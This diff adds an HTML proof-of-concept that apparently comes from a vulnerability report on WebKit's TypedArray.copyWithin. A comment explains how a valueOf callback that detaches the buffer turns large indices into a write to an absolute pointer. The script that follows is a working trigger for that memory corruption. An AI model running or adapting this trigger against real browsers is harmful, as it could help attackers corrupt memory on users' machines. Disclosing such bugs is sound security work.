@@ -1,0 +1,56 @@
+<!--
+There is a bug in TypedArray.copyWithin that can be used to write to an absolute pointer. 
+
+In JavaScriptCore/runtime/JSGenericTypedArrayViewPrototypeFunctions.h, the function genericTypedArrayViewProtoFuncCopyWithin contains the following code:
+
+    long length = thisObject->length();
+    long to = argumentClampedIndexFromStartOrEnd(exec, 0, length);
+    long from = argumentClampedIndexFromStartOrEnd(exec, 1, length);
+    long final = argumentClampedIndexFromStartOrEnd(exec, 2, length, length);
+
+    if (final < from)
+        return JSValue::encode(exec->thisValue());
+
+    long count = std::min(length - std::max(to, from), final - from);
+
+    typename ViewClass::ElementType* array = thisObject->typedVector();
+    memmove(array + to, array + from, count * thisObject->elementSize);
+
+argumentClampedIndexFromStartOrEnd will call valueOf on a parameter to the copyWithin function, which can contain a function that neuters the this array, causing the variable "array" to be null. However, the "to" and "from" variables can be very large values, up to 0x7fffffff, which could be valid pointers on ARM and 32-bit platforms. This allows an absolute pointer in this range to be written to.
+
+An HTML file demonstrating this issue is attached. This issue affects Safari Technology Preview and WebKit, but has not made it into production Safari yet (TypedArray.copyWithin is not supported).
+-->
+
+<html>
+<body>
+<script>
+
+function f(){
+   try{
+   alert("t");
+   postMessage("test", "http://127.0.0.1", [q])
+   alert(a.byteLength);
+   alert(q.byteLength);
+  } catch(e){
+     alert(e.message);
+   alert(a.byteLength)
+   alert(q.byteLength);
+  }
+   return 0x22345678;
+}
+
+alert(Date);
+
+var q = new ArrayBuffer(0x7fffffff);
+var o = {valueOf : f}
+var a = new Uint8Array(q);
+
+  // alert(q.byteLength);
+var t = [];
+
+a.copyWithin(0x12345678, o, 0x32345678);
+
+
+</script>
+</body>
+</html>
